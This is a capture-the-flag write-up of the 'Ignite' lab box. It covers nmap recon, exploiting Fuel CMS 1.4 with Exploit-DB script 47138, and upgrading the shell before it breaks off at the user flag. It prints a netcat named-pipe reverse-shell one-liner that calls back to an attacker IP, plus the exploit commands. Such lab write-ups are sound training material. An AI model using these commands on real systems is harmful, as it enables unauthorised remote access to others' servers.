## üß† Overview

Ignite was a chill box. Started with some light web recon, spotted a CMS, and used a known exploit to get in. After that, a bit of digging around led me to an easy privilege escalation. Straightforward overall, but good practice. :


## üîç Recon

Started with a full port scan using nmap 

```
nmap -sV -sS -T4 -p- <IP>
```

Found HTTP open on port 80,running Apache httpd 2.4.18 ((Ubuntu))

Fuel CMS v1.4 was running on the http server and it is a preety known vulnerability which can be exploited by Remote code execution.


## üí• Exploitation


Once I confirmed the site was running Fuel CMS, I looked up known vulnerabilities and found a remote code execution (RCE) exploit for Fuel CMS version <= 1.4.1.

```
searchsploit fuel cms
```

```
searchsploit -m linux/webapps/47138.py
```

here the command ``` -m ``` saved our time by downloading the RCE payload from EXPLOIT-DB(no need to manually copy it from the website)


Now lets go through our payload and do some changes

1)Here I updated the url to our target ip http://<IP>


2)Rmoved the proxy payload as I was not using burpsuite for this machine because I didn‚Äôt need to intercept the traffic.


3)To check if the exploit was actually sending requests and getting a valid response, I added:


```
r = requests.get(burp0_url)
```

## üß® Payload Execution 
Now lets execute the payload 

Just make sure you have a Netcat listener ready before running the reverse shell:

```
nc -lvnp 4444
```

```
python3 47138.py http://<IP>

```

Alrigt we got our output 

we didnt get any reverse shell here we can see **CMD**

It's just a label in the script's output, showing what command was issued.

To bypass this I copied a netcat revershell command from pentest monkey 

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER IP> 4444 > /tmp/f
```

rm /tmp/f; mkfifo /tmp/f: Removes any existing pipe, then creates a new named pipe.

cat /tmp/f | /bin/sh -i: Sets up a shell to read from the pipe.


Less goo,we got the reverse shell

**First of all lets upgrade the shell**

The initial reverse shell was limited ‚Äî no TTY, no proper terminal control. To fix that, I upgraded the shell using Python:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Now lets go through the target machine and Find the flags


I found the User.txt flag in /home/www-data


www-data is a low priviledge user system
